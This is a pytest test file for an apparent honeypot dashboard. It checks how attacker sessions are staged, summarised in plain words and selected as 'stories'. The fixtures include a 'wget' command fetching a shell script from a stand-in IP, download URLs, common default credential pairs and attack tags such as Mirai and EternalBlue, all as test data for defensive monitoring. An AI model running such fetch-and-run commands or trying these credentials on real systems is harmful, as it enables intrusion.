from datetime import UTC, datetime, timedelta

import pytest

from api.story import (
    EXPLOIT_TAGS,
    MAX_STEPS,
    Candidate,
    GuessAggregate,
    RawEvent,
    Totals,
    bucket_seconds,
    bucket_starts,
    build_steps,
    classify_stage,
    clip,
    duration_phrase,
    headline,
    select_stories,
    story_summary,
    story_title,
)

T0 = datetime(2026, 10, 27, 12, 0, tzinfo=UTC)


def _stage(**kw: object) -> str:
    base: dict[str, object] = {
        "login_attempts": 0,
        "login_success": False,
        "commands": 0,
        "downloads": 0,
        "tags": [],
    }
    base.update(kw)
    return classify_stage(**base)  # type: ignore[arg-type]


@pytest.mark.parametrize(
    ("kw", "expected"),
    [
        ({}, "looked"),
        ({"login_attempts": 3}, "guessed"),
        ({"login_attempts": 3, "login_success": True}, "got_in"),
        ({"login_success": True, "commands": 2}, "commands"),
        ({"commands": 2, "downloads": 1}, "download"),
        ({"commands": 2, "tags": ["malware-drop"]}, "download"),
        ({"downloads": 1, "tags": ["php2shell"]}, "exploit"),
        ({"tags": ["recon", "sql-rce"]}, "exploit"),
        ({"tags": ["bluekeep"]}, "looked"),
        ({"tags": ["mirai"], "login_attempts": 1}, "guessed"),
    ],
)
def test_stage_is_the_deepest_step(kw: dict[str, object], expected: str) -> None:
    assert _stage(**kw) == expected


def test_every_exploit_tag_is_an_exploit() -> None:
    for tag in EXPLOIT_TAGS:
        assert _stage(tags=[tag]) == "exploit"


def test_clip_is_single_line_and_bounded() -> None:
    out = clip("a\nb  c" + "x" * 500)
    assert "\n" not in out and len(out) == 200 and out.endswith("…")


def _totals(**kw: int) -> Totals:
    base = {
        "sessions": 0,
        "sources": 0,
        "countries": 0,
        "guessed": 0,
        "got_in": 0,
        "ran_commands": 0,
        "downloads": 0,
        "exploits": 0,
    }
    base.update(kw)
    return Totals(**base)


def test_headline_is_plain_and_uses_counts() -> None:
    totals = _totals(sessions=21034, sources=612, countries=41)
    text = headline(24, totals, {"guessed": 15000, "looked": 6034})
    assert text.startswith(
        "In the last 24 hours, 612 machines from 41 countries knocked on your doors 21,034 times."
    )
    assert "guessing passwords" in text


def test_headline_singular_and_quiet() -> None:
    text = headline(1, _totals(sessions=1, sources=1, countries=1, exploits=1), {"exploit": 1})
    assert "the last hour, 1 machine from 1 country knocked on your doors 1 time." in text
    assert "1 visitor sent an exploit." in text
    assert headline(6, _totals(), {}) == "Nothing knocked on your doors in the last 6 hours."


def test_titles_and_summaries_carry_no_attacker_text() -> None:
    title = story_title(
        stage="download", sensor="telnet", tags=["mirai"], login_success=True, login_attempts=37
    )
    assert title == "A Mirai robot broke into the Telnet door and tried to install a program"
    guessed = story_title(
        stage="guessed", sensor="ssh", tags=[], login_success=False, login_attempts=1
    )
    assert guessed == "A robot tried 1 password on the SSH door"
    summary = story_summary(
        stage="download",
        country="NL",
        login_attempts=37,
        login_success=True,
        commands=5,
        downloads=1,
        seconds=120,
    )
    assert summary == (
        "From Netherlands. It guessed 37 passwords in 2 minutes, got in, "
        "ran 5 commands, then tried to download 1 program."
    )
    quiet = story_summary(
        stage="looked",
        country=None,
        login_attempts=0,
        login_success=False,
        commands=0,
        downloads=0,
        seconds=1,
    )
    assert quiet == "It only looked around, then left."


def test_duration_phrase() -> None:
    assert duration_phrase(1) == "1 second"
    assert duration_phrase(120) == "2 minutes"
    assert duration_phrase(7200) == "2 hours"


def _ev(i: int, type_: str, **kw: object) -> RawEvent:
    return RawEvent(ts=T0 + timedelta(seconds=i), type=type_, **kw)  # type: ignore[arg-type]


def test_steps_merge_consecutive_events() -> None:
    events = [_ev(0, "connect")]
    events += [
        _ev(1 + i, "login_attempt", username="root", password=f"pw{i % 2}") for i in range(37)
    ]
    events += [_ev(40, "login_attempt", username="root", password="admin", success=True)]
    events += [_ev(41, "command", command="wget http://203.0.113.9/x.sh")]
    events += [_ev(42, "download_attempt", url="http://203.0.113.9/x.sh"), _ev(43, "disconnect")]
    steps = build_steps(events)
    assert [s.kind for s in steps] == [
        "connect",
        "guess",
        "login",
        "command",
        "download",
        "disconnect",
    ]
    guess = steps[1]
    assert guess.count == 37 and guess.plain == "Tried 37 passwords"
    assert guess.technical.startswith("37 login_attempt · top root/pw")
    assert steps[3].plain == "Ran a command"
    assert "wget http://203.0.113.9/x.sh" in steps[3].technical
    assert "203.0.113.9" not in steps[3].plain


def test_http_requests_with_exploit_tags_are_exploits() -> None:
    steps = build_steps(
        [
            _ev(0, "http_request", path="/"),
            _ev(1, "http_request", path="/?php_session_upload_progress", tags=["php2shell"]),
        ]
    )
    assert [s.kind for s in steps] == ["scan", "exploit"]
    assert steps[1].plain == "Sent an exploit"


def test_steps_are_capped_and_keep_the_severe_ones() -> None:
    events: list[RawEvent] = []
    for i in range(10):
        events.append(_ev(i * 4, "connect"))
        events.append(_ev(i * 4 + 1, "login_attempt", username="a", password="b"))
        events.append(_ev(i * 4 + 2, "command", command="id"))
    events.append(_ev(100, "download_attempt", url="http://198.51.100.2/m"))
    steps = build_steps(events)
    assert len(steps) <= MAX_STEPS
    assert steps[-1].kind == "download"


def test_technical_text_is_truncated() -> None:
    steps = build_steps([_ev(0, "command", command="x" * 1000)])
    assert len(steps[0].technical) <= 200


def _cand(
    sid: str,
    ip: str,
    rank: int,
    events: int,
    minute: int,
    camp: int | None = None,
    sensor: str | None = None,
) -> Candidate:
    # Each candidate gets its own door unless a test says otherwise.
    return Candidate(
        sid, ip, camp, rank, events, T0 + timedelta(minutes=minute), sensor or f"door-{sid}"
    )


def test_selection_orders_by_depth_events_then_recency() -> None:
    picked = select_stories(
        [
            _cand("a", "192.0.2.1", 3, 10, 0),
            _cand("b", "192.0.2.2", 5, 2, 0),
            _cand("c", "192.0.2.3", 3, 10, 5),
            _cand("d", "192.0.2.4", 3, 50, 0),
        ]
    )
    assert [c.session_id for c in picked] == ["b", "d", "c", "a"]


def test_selection_one_per_address_and_campaign() -> None:
    picked = select_stories(
        [
            _cand("a", "192.0.2.1", 5, 9, 0, camp=1),
            _cand("b", "192.0.2.1", 4, 9, 1),
            _cand("c", "192.0.2.2", 4, 9, 2, camp=1),
            _cand("d", "192.0.2.3", 3, 9, 3, camp=2),
            _cand("e", "192.0.2.4", 3, 8, 3, camp=2),
        ]
    )
    assert [c.session_id for c in picked] == ["a", "d"]


def test_selection_is_capped_at_five() -> None:
    cands = [_cand(str(i), f"198.51.100.{i}", 1, i, 0) for i in range(20)]
    assert len(select_stories(cands)) == 5


def test_buckets() -> None:
    assert bucket_seconds(24) == 3600 and bucket_seconds(6) == 900
    since = T0 - timedelta(hours=24, minutes=10)
    starts = bucket_starts(since, T0, 3600)
    assert starts[0] == datetime(2026, 10, 26, 11, 0, tzinfo=UTC)
    assert starts[-1] == T0 and len(starts) == 26


def test_failed_logins_come_as_one_aggregate_step() -> None:
    events = [
        _ev(0, "connect"),
        _ev(700, "login_attempt", username="root", password="admin", success=True),
        _ev(701, "command", command="uname -a"),
        _ev(702, "download_attempt", url="http://203.0.113.9/m.sh"),
    ]
    guesses = GuessAggregate(
        count=600,
        first_ts=T0 + timedelta(seconds=1),
        last_ts=T0 + timedelta(seconds=699),
        top=[("root/123456", 40), ("admin/admin", 30), ("x" * 500, 20)],
    )
    steps = build_steps(events, guesses)
    assert [s.kind for s in steps] == ["connect", "guess", "login", "command", "download"]
    guess = steps[1]
    assert guess.count == 600 and guess.plain == "Tried 600 passwords"
    assert guess.technical.startswith("600 login_attempt · top root/123456, admin/admin")
    assert len(guess.technical) <= 200
    assert steps[-1].plain == "Tried to download a program"


def test_sessions_stage_filter_rejects_unknown_values() -> None:
    from starlette.testclient import TestClient

    from api.main import create_app

    with TestClient(create_app(None)) as client:
        assert client.get("/api/v1/sessions", params={"stage": "nonsense"}).status_code == 422


def test_selection_spreads_over_doors_and_stages() -> None:
    cands = [_cand(f"m{i}", f"192.0.2.{i}", 5, 100 - i, 0, sensor="mysql") for i in range(1, 5)]
    cands += [_cand("ms", "198.51.100.1", 5, 50, 0, sensor="mssql")]
    cands += [_cand("dl", "198.51.100.2", 4, 5, 0, sensor="telnet")]
    cands += [_cand("cm", "198.51.100.3", 3, 5, 0, sensor="ssh")]
    cands += [_cand("gi", "198.51.100.4", 2, 5, 0, sensor="ssh")]
    picked = select_stories(cands)
    assert [c.session_id for c in picked] == ["m1", "ms", "dl", "cm", "gi"]


def test_selection_caps_a_door_and_relaxes_only_when_short() -> None:
    cands = [_cand(f"m{i}", f"192.0.2.{i}", 5, 100 - i, 0, sensor="mysql") for i in range(1, 6)]
    cands += [_cand("s1", "198.51.100.1", 1, 5, 0, sensor="ssh")]
    picked = select_stories(cands)
    # The other door is covered, and the busy door is reused only to fill the slots.
    assert "s1" in {c.session_id for c in picked}
    assert len(picked) == 5
    only_mysql = select_stories(cands[:5])
    assert len(only_mysql) == 5  # relaxed: nothing else is left


def test_exploit_titles_name_the_attack_in_plain_words() -> None:
    def title(tag: str) -> str:
        return story_title(
            stage="exploit", sensor="mysql", tags=[tag], login_success=False, login_attempts=0
        )

    assert title("db-ransom") == (
        "A robot tried to wipe a database and leave a ransom note (MySQL door)"
    )
    assert "run its own commands" in title("sql-rce")
    assert "flaw in PHP" in title("php2shell")
    assert "EternalBlue" in title("eternalblue")
    assert "Redis" in title("redis-rogue-master")
    assert "container" in title("container-escape")
    generic = story_title(
        stage="exploit", sensor="mssql", tags=["recon"], login_success=False, login_attempts=0
    )
    assert generic == "A robot sent an exploit to the MSSQL door"


def test_exploit_summary_uses_the_same_words() -> None:
    summary = story_summary(
        stage="exploit",
        country="NL",
        login_attempts=0,
        login_success=False,
        commands=0,
        downloads=0,
        seconds=3,
        tags=["sql-rce"],
    )
    assert summary == "From Netherlands. It tried to make the database run its own commands."
